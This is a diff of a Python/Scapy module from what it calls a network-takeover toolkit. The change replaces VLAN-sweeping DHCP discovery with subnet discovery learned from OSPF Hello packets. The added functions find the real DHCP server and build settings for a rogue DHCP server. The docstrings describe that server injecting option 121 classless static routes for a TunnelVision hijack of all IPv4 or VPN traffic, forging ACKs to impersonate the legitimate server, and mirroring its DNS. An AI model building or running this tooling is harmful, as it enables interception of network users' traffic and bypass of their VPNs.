@@ -1,22 +1,23 @@
 #!/usr/bin/env python3
-# v2.1
+# v3.0
 """
 dhcp_takeover.py — DHCP engine for the network-takeover toolkit.
 
 A library module (no orchestration of its own — see main.py).  Provides:
-  - DHCPDISCOVER sweeps and DHCPOFFER sniffing
-  - static-address / VLAN-subinterface / loopback management for identity theft
-  - a rogue DHCP server (OFFER / ACK / NAK / RELEASE) with:
-      * DNS mirrored from the real server's offer
-      * option 121 (classless static routes) driven by server_details, so the
-        same builder serves both the full TunnelVision hijack and the selective
-        VPN-subnet relay (see vpn_relay.py) without duplication
-      * optional impersonation of the real server (forged ACKs)
 
-VLAN/subnet discovery is now done via OSPF Hello sniffing (ospf_adjacency.py).
-OSPF adjacency forming and route injection live in ospf_adjacency.py; HTTP
-capture in http_intercept.py; VPN relay in vpn_relay.py.  main.py wires them
-together.
+  Network setup (OSPF-derived, no trunking):
+    pick_client_ip          Choose our IP from the OSPF-learned subnet.
+    send_dhcpdiscover       Single untagged DHCPDISCOVER to find the real server.
+    sniff_dhcpoffer         Capture the resulting DHCPOFFER (server IP + DNS).
+    build_server_details_from_ospf  Assemble the server_details dict that the
+                            rogue DHCP server consumes, populated with OSPF and
+                            offer data.
+
+  Rogue DHCP server (unchanged — still needed for option 121 injection):
+    A full OFFER / ACK / NAK / RELEASE server with:
+      * option 121 classless static routes (TunnelVision / VPN relay)
+      * impersonation of the real server when a client picks it (forged ACKs)
+      * DNS mirrored from the real server's offer
 """
 import ipaddress
 import platform
@@ -44,7 +45,6 @@ DEFAULT_SUBNET_MASK = "255.255.255.0"
 DEFAULT_PREFIX_LENGTH = 24
 DEFAULT_DHCP_LEASE_TIME = 30 * 24 * 60 * 60
 MAX_DHCP_LEASE_TIME = 0xFFFFFFFF
-DEFAULT_DHCP_DISCOVER_VLANS = range(1, 30 + 1)
 DEFAULT_INTERFACE = "eth0"
 INTERFACE_IPV4_WAIT_INTERVAL = 2
 INTERFACE_IPV4_WAIT_TIMEOUT = 60
@@ -238,141 +238,121 @@ def get_first_ipv4_address(value):
     return None
 
 
-def build_vlan_details_from_offers(offers):
-    """Build VLAN-to-network details learned from upstream DHCPOFFER packets."""
-    vlan_details = {}
-    for offer in offers:
-        vlan_id = offer.get("vlan")
-        subnet_mask = offer.get("subnet_mask")
-        router = get_first_ipv4_address(offer.get("router"))
-        if not router and offer.get("giaddr") != "0.0.0.0":
-            router = offer.get("giaddr")
-        offered_ip = offer.get("offered_ip")
 
-        if vlan_id is None or not subnet_mask:
-            continue
+# ── OSPF-derived network setup ────────────────────────────────────────────────
 
-        network_source = router or offered_ip
-        if not network_source:
-            continue
+def pick_client_ip(ospf_params, host_offset=2):
+    """Pick an IP in the OSPF-learned subnet for our own interface.
 
-        try:
-            network = ipaddress.IPv4Network(f"{network_source}/{subnet_mask}", strict=False)
-        except ValueError as exc:
-            print_step(
-                "WARN",
-                f"Skipping VLAN {vlan_id} offer details with invalid network data: {exc}",
-            )
-            continue
-
-        vlan_details[vlan_id] = {
-            "vlan_id": vlan_id,
-            "network": network,
-            "subnet_mask": subnet_mask,
-            "router": router,
-            "dns": get_first_ipv4_address(offer.get("dns")),
-            "dhcp_server_ip": offer.get("dhcp_server_ip"),
-            "offered_ip": offered_ip,
-        }
-        print_step(
-            "OK",
-            f"Learned VLAN {vlan_id} network={network} router={router} dns={vlan_details[vlan_id]['dns']} from DHCPOFFER",
-        )
-
-    return vlan_details
+    Starts at network_address + host_offset and skips the SVI gateway IP so we
+    never collide with the router.  Raises ValueError if the subnet is too small.
+    """
+    network = ipaddress.IPv4Network(
+        f"{ospf_params['src_ip']}/{ospf_params['netmask']}", strict=False
+    )
+    gateway = ipaddress.IPv4Address(ospf_params["src_ip"])
+    candidate = network.network_address + host_offset
+    while candidate <= network.broadcast_address:
+        if candidate != gateway and candidate != network.network_address and candidate != network.broadcast_address:
+            return str(candidate)
+        candidate += 1
+    raise ValueError(f"No usable host IP found in {network} (gateway={gateway})")
 
 
-def normalize_vlan_ids(vlan_ids):
-    normalized_vlan_ids = []
-    seen_vlan_ids = set()
-    for vlan_id in vlan_ids:
-        try:
-            vlan_id = int(vlan_id)
-        except (TypeError, ValueError):
-            print_step("SKIP", f"Ignoring invalid VLAN ID {vlan_id}")
-            continue
-        if not 1 <= vlan_id <= 4094:
-            print_step("SKIP", f"Ignoring out-of-range VLAN ID {vlan_id}")
-            continue
-        if vlan_id in seen_vlan_ids:
-            continue
-        normalized_vlan_ids.append(vlan_id)
-        seen_vlan_ids.add(vlan_id)
-    return normalized_vlan_ids
+def send_dhcpdiscover(interface):
+    """Broadcast a single untagged DHCPDISCOVER to find the real DHCP server.
+
+    No 802.1Q tag — we are a normal access-port client.  The switch relays the
+    broadcast to the DHCP server via ip helper-address.
+    """
+    src_mac = get_if_hwaddr(interface)
+    src_mac_bytes = mac2str(src_mac)
+    xid = random.getrandbits(32)
+    pkt = (
+        Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)
+        / IP(src="0.0.0.0", dst="255.255.255.255")
+        / UDP(sport=68, dport=67)
+        / BOOTP(op=1, htype=1, hlen=6, xid=xid, chaddr=src_mac_bytes)
+        / DHCP(options=[("message-type", "discover"), "end"])
+    )
+    sendp(pkt, iface=interface, verbose=False)
+    print_step("OK", f"Sent untagged DHCPDISCOVER on {interface} xid={xid:#010x}")
+    return xid
 
 
-def send_DHCPDiscover_VLANs(interface, vlan_ids=None):
-    print_step("START", "Getting MAC Address from Interface")
-    interface_MAC = get_if_hwaddr(interface)
-    interface_MAC_bytes = mac2str(interface_MAC)
-    print_step("OK", f"Hardware MAC Address: {interface_MAC}")
+def sniff_dhcpoffer(interface, timeout=10):
+    """Wait for a DHCPOFFER and return its parsed details, or None on timeout.
 
-    selected_vlan_ids = normalize_vlan_ids(vlan_ids or DEFAULT_DHCP_DISCOVER_VLANS)
-    if not selected_vlan_ids:
-        print_step("WARN", "No VLAN IDs selected for DHCPDISCOVER probes")
-        return
+    Used after send_dhcpdiscover to learn the real DHCP server's IP (option 54)
+    and DNS server (option 6) for use in our rogue server's responses.
+    """
+    result = []
 
-    print_step("START", f"Sending DHCPDISCOVER packets on VLANs {selected_vlan_ids}")
-    for vlan_id in selected_vlan_ids:
-        transaction_id = random.getrandbits(32)
-        dhcp_discover = (
-            Ether(dst="ff:ff:ff:ff:ff:ff", src=interface_MAC)
-            / Dot1Q(vlan=vlan_id)
-            / IP(src="0.0.0.0", dst="255.255.255.255")
-            / UDP(sport=68, dport=67)
-            / BOOTP(op=1, htype=1, hlen=6, xid=transaction_id, chaddr=interface_MAC_bytes)
-            / DHCP(options=[("message-type", "discover"), "end"])
-        )
-        sendp(dhcp_discover, iface=interface, verbose=False)
-        print_step("OK", f"Sent DHCPDiscover with VLAN ID {vlan_id} xid={transaction_id}")
-
-
-def sniff_DHCPOffer_packets(interface, timeout=30, count=0):
-    offers = []
-    seen_offers = set()
-
-    def handle_offer(packet):
-        if not packet.haslayer(BOOTP) or not is_dhcp_offer(packet):
+    def _handle(pkt):
+        if not (pkt.haslayer(BOOTP) and pkt.haslayer(DHCP)):
             return
-        offer_details = get_offer_details(packet)
-        offer_key = (
-            offer_details["vlan"],
-            offer_details["offered_ip"],
-            offer_details["server_id"],
-            offer_details["src_mac"],
-        )
-        if offer_key in seen_offers:
-            print_step(
-                "SKIP",
-                f"Duplicate DHCPOFFER vlan={offer_details['vlan']} offered_ip={offer_details['offered_ip']}",
-            )
+        if get_dhcp_message_type(pkt) not in DHCP_OFFER_TYPES:
             return
-        seen_offers.add(offer_key)
-        offers.append(offer_details)
-        print_step(
-            "OK",
-            (
-                f"DHCPOFFER vlan={offer_details['vlan']} "
-                f"offered_ip={offer_details['offered_ip']} "
-                f"server_id={offer_details['server_id']} "
-                f"router={offer_details['router']} "
-                f"dns={offer_details['dns']} "
-                f"src_mac={offer_details['src_mac']}"
-            ),
-        )
+        result.append(get_offer_details(pkt))
+        return True  # stop_filter
 
-    print_step("START", f"Sniffing DHCPOFFER packets on {interface}")
+    print_step("START", f"Waiting {timeout}s for DHCPOFFER on {interface}")
     sniff(
         iface=interface,
         filter=DHCP_SNIFF_FILTER,
-        lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
-        prn=handle_offer,
         store=False,
         timeout=timeout,
-        count=count,
+        stop_filter=lambda _: bool(result),
+        prn=_handle,
     )
-    print_step("OK", f"Finished sniffing DHCPOFFER packets. Found {len(offers)} offer(s)")
-    return offers
+    if not result:
+        print_step("WARN", "No DHCPOFFER received — server IP and DNS will be unknown")
+        return None
+    offer = result[0]
+    print_step("OK", f"DHCPOFFER from server_id={offer['server_id']} dns={offer['dns']}")
+    return offer
+
+
+def build_server_details_from_ospf(interface, ospf_params, our_ip, offer=None, dns=None):
+    """Build the server_details dict consumed by the rogue DHCP server.
+
+    ospf_params   — learned from sniff_ospf_hellos (gives subnet + gateway).
+    our_ip        — our chosen interface IP (from pick_client_ip).
+    offer         — optional DHCPOFFER dict from sniff_dhcpoffer; if provided,
+                    populates real_server_ip and dns from the legitimate server.
+    dns           — manual DNS override (takes precedence over offer).
+
+    The rogue server will advertise our_ip as its server_id.  When a client
+    sends a REQUEST to the real server (option 54 != our_ip), the
+    IMPERSONATE_REAL_SERVER path in ack_request() forges an ACK spoofing the
+    real server's identity, learned directly from the client's REQUEST packet.
+    """
+    netmask = ospf_params["netmask"]
+    gateway = ospf_params["src_ip"]  # SVI IP = default gateway for this subnet
+    network = ipaddress.IPv4Network(f"{gateway}/{netmask}", strict=False)
+
+    resolved_dns = dns or (get_first_ipv4_address(offer.get("dns")) if offer else None)
+
+    print_step(
+        "OK",
+        f"DHCP server details: our_ip={our_ip} gateway={gateway} "
+        f"network={network} dns={resolved_dns or 'unknown'}",
+    )
+    return {
+        "interface": interface,
+        "source_ip": our_ip,
+        "gateway": gateway,
+        "netmask": netmask,
+        "dns": resolved_dns,
+        "network": network,
+        "vlan_details": {},
+        "relay_only": False,
+        "answered_request_xids": set(),
+        "opt121_subnets": list(HIJACK_ROUTE_PREFIXES),
+        "opt121_default_via_router": False,
+    }
+
+
 
 
 def set_static_address_windows(interface, address, netmask, gateway=None):
@@ -499,25 +479,6 @@ def ensure_vlan_subinterface(parent_interface, vlan_id):
     return subinterface
 
 
-def add_loopback_ipv4_address(address, prefix_length=32):
-    if platform.system().lower() != "linux":
-        raise OSError("Loopback DHCP server identity setup is only supported on Linux/Kali")
-    if not shutil.which("ip"):
-        raise FileNotFoundError("The Linux 'ip' command is required to add the loopback address")
-    ipaddress.IPv4Address(address)
-    existing_addresses = [
-        current_address.split("/", 1)[0]
-        for current_address in get_interface_ipv4_addresses("lo", scope=None)
-    ]
-    if address in existing_addresses:
-        print_step("OK", f"Loopback already has DHCP server identity {address}")
-    else:
-        run_command(
-            f"Adding DHCP server identity {address}/{prefix_length} to loopback",
-            ["ip", "addr", "add", f"{address}/{prefix_length}", "dev", "lo"],
-        )
-    run_command("Bringing loopback interface up", ["ip", "link", "set", "lo", "up"])
-
 
 def remove_kali_ipv4_addresses(interface):
     print_step("START", f"Removing existing IPv4 addresses from Linux interface {interface}")
@@ -570,77 +531,6 @@ def set_static_address(interface, address, netmask, gateway=None):
         raise OSError(f"Unsupported operating system for static address setup: {platform.system()}")
     print_step("OK", f"Static address setup finished on {interface}")
 
-
-def get_offered_client_ip(offer):
-    address = offer.get("offered_ip")
-    if not address or address == "0.0.0.0":
-        print_step("FAIL", "DHCPOFFER does not contain a usable offered client IP")
-        raise ValueError("DHCPOFFER does not contain a usable offered client IP")
-    ipaddress.IPv4Address(address)
-    return address
-
-
-def get_original_dhcp_server_ip(offer):
-    address = offer.get("dhcp_server_ip") or offer.get("server_id") or offer.get("src_ip")
-    if not address or address == "0.0.0.0":
-        print_step("FAIL", "DHCPOFFER does not contain a usable DHCP server IP")
-        raise ValueError("DHCPOFFER does not contain a usable DHCP server IP")
-    ipaddress.IPv4Address(address)
-    return address
-
-
-def set_static_address_from_offer(interface, offer):
-    address = get_offered_client_ip(offer)
-    netmask = offer.get("subnet_mask")
-    print_step("START", f"Preparing offered VLAN interface address from offer: {offer}")
-    if not netmask:
-        print_step("FAIL", "DHCPOFFER does not contain a subnet mask")
-        raise ValueError("DHCPOFFER does not contain a subnet mask")
-    print_step("OK", f"Selected offered client IP {address} as this host's VLAN interface address")
-    set_static_address(interface, address, netmask)
-    return address
-
-
-def build_server_details_from_offer(interface, offer, offers=None):
-    """Build DHCP server settings from the selected upstream DHCPOFFER, including learned DNS."""
-    server_ip = get_original_dhcp_server_ip(offer)
-    netmask = offer.get("subnet_mask")
-    gateway = get_first_ipv4_address(offer.get("router"))
-    dns = get_first_ipv4_address(offer.get("dns"))
-    vlan_details = build_vlan_details_from_offers(offers or [offer])
-
-    print_step("START", f"Building fallback DHCP server details from offer: {offer}")
-    if not netmask:
-        print_step("FAIL", "Selected offer does not contain a subnet mask")
-        raise ValueError("Selected offer does not contain a subnet mask")
-
-    # The client subnet is determined by the IP the legitimate server OFFERED
-    # (yiaddr), not by the server's own management IP.  Using server_ip here
-    # would give the server's admin subnet (e.g. 100.0/24) instead of the pool
-    # the server actually serves (e.g. 10.1.2.0/24).
-    offered_client_ip = get_offered_client_ip(offer)
-    client_network = ipaddress.IPv4Network(f"{offered_client_ip}/{netmask}", strict=False)
-
-    details = {
-        "interface": interface,
-        "source_ip": server_ip,
-        "gateway": gateway,
-        "netmask": netmask,
-        "dns": dns,
-        "network": client_network,
-        "vlan_details": vlan_details,
-        "relay_only": True,
-        "answered_request_xids": set(),
-        # Option 121 policy (consumed by build_dhcp_response):
-        #   opt121_subnets            -> CIDRs routed via source_ip (our identity)
-        #   opt121_default_via_router -> also push 0.0.0.0/0 via the per-VLAN router
-        # Default = full TunnelVision hijack (all IPv4 via us, no passthrough).
-        # vpn_relay.configure_* overrides these for selective / passthrough modes.
-        "opt121_subnets": list(HIJACK_ROUTE_PREFIXES),
-        "opt121_default_via_router": False,
-    }
-    print_step("OK", f"Fallback DHCP server details: source_ip={server_ip} client_network={client_network} dns={dns} gateway={gateway}")
-    return details
 
 
 def get_server_mac(server_details):
@@ -1264,10 +1154,6 @@ def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_detail
     print_step("OK", f"Finished DHCP client sniff loop with {len(handled_events)} handled event(s)")
     return handled_events
 
-
-def sniff_worker(interface, result_queue):
-    offers = sniff_DHCPOffer_packets(interface, timeout=30)
-    result_queue.put(offers)
 
 
 # This module is a library — the orchestration that used to live in main() now
